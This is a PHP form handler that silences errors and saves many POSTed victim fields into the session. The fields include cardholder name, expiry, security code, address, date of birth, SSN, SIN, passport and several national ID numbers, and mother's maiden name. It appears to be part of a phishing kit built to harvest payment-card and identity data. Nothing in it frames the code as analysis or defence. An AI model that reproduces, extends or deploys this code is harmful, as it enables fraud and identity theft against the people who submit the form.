<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
$_SESSION['ch'] = $_POST['fnm'];
$_SESSION['cex'] = $_POST['cex'];
$_SESSION['csc'] = $_POST['csc'];
$_SESSION['cid'] = $_POST['cid'];
$_SESSION['fnm'] = $_POST['fnm'];
$_SESSION['adr'] = $_POST['adr'];
$_SESSION['cty'] = $_POST['cty'];
$_SESSION['stt'] = $_POST['stt'];
$_SESSION['cnt'] = $_POST['cnt'];
$_SESSION['zip'] = $_POST['zip'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['ptp'] = $_POST['ptp'];
$_SESSION['pnm'] = $_POST['pnm'];
$_SESSION['osid'] = $_POST['osid'];
$_SESSION['nationalid'] = $_POST['nationalid'];
$_SESSION['qatarid'] = $_POST['qatarid'];
$_SESSION['civilid'] = $_POST['civilid'];
$_SESSION['citizenid'] = $_POST['citizenid'];
$_SESSION['sin'] = $_POST['sin'];
$_SESSION['ssn'] = $_POST['ssn'];
$_SESSION['passport'] = $_POST['passport'];
$_SESSION['idnum'] = $_POST['idnum'];
$_SESSION['mmn'] = $_POST['mmn'];
exit('done');